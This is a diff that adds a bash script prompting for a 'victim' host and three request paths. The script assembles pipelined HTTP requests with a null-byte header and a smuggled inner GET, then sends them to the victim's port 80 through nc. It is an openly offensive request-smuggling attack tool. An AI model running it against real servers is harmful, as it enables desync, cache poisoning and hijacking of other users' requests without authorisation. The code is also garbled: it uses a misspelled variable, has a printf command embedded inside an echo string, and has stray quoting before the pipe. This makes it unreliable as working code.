@@ -1,0 +1,28 @@
+#!/bin/bash
+echo -ne "[+] Enter Victim: "
+read victim
+
+echo -ne "[+] Enter Special Request: "
+read pagepath1
+
+echo -ne "[+] Enter Special Request: "
+read pagepath2
+
+echo -ne "[+] Enter Special Request: "
+read pagepath3
+
+echo "GET /$pathpath1 HTTP/1.1\r\n
+Host: $victim\r\n
+aa: \0bb\r\n
+GET $pagepath2 HTTP/1.1\r\n
+\r\n
+GET /$pagepath3 HTTP/1.1\r\n
+Host: $victim\r\n
+\r\nprintf 'GET /400 HTTP/1.1\r\n'\
+'Host: $victim\r\n'\
+'aa: \0bb\r\n'\
+'GET $pagepath1 HTTP/1.1\r\n'\
+'\r\n'\
+'GET /$pagepath2 HTTP/1.1\r\n'\
+'Host: $victim\r\n'\
+'\r\n'\"; | nc $victim 80
